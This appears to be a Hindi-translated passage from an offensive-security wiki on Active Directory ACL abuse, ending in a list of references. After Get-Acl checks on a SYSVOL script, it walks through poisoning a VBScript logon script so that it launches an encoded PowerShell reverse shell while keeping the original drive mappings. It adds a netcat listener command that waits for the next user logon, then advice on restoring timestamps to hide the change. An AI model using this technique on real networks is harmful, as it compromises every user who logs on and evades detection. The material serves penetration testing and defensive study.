Automated tooling SYSVOL/NETLOGON को read-only दिखा सकती है, जबकि किसी खास script का NTFS ACL अलग हो सकता है। उस file और उसकी parent directory का read-only निरीक्षण करके शुरुआत करें; matching Allow ACEs संभावित विकल्प बने रहते हैं, क्योंकि प्रभावी SMB और NTFS access, Deny ACEs और मौजूदा token—सभी मायने रखते हैं:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

एक authorized write test target-specific और reversible होना चाहिए; original script का backup लेकर उसे restore करें। केवल access test करने के लिए किसी working logon script को overwrite न करें; successful write अगले user के logon पर run हो सकता है।

### RCE के लिए VBScript logon script में poison करें
एक ऐसा command append करें जो PowerShell reverse shell launch करे (revshells.com से generate करें) और business function को बाधित होने से बचाने के लिए original logic बनाए रखें:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

अपने होस्ट पर लिसन करें और अगले interactive logon का इंतज़ार करें:

```bash
rlwrap -cAr nc -lnvp 443
```

नोट्स:
- Execution, logging user के token के तहत होता है (SYSTEM के तहत नहीं)। Scope वह GPO link (OU, site, domain) है जो उस script को लागू करता है।
- उपयोग के बाद मूल content/timestamps को restore करके cleanup करें।


## References

- [1] [Active Directory ACLs/ACEs का दुरुपयोग](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Privileged Accounts और Token Privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – ACL Attack Path Update](https://wald0.com/?p=112)
- [4] [ActiveDirectoryRights Enum - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Active Directory में ACLs के साथ privileges बढ़ाना](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Active Directory Privileges और Privileged Accounts के लिए स्कैन करना](https://adsecurity.org/?p=3658)
- [7] [ActiveDirectoryAccessRule Constructor - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – Linux से AD attributes/UAC operations](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (group membership)](https://www.samba.org/)
- [10] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, और DC admin तक DPAPI decryption](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: Code Execution और NTLM Relay के लिए GPO UNC Paths को Hijack करना](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: NTLM relaying और अन्य तरीकों से Active Directory GPOs का exploitation](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU having a laugh? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: Active Directory में छिपे Organizational Units के ACL attack vectors का exploitation](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Network पर वैध Active Directory services का simulation: GPO exploitation का मामला](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
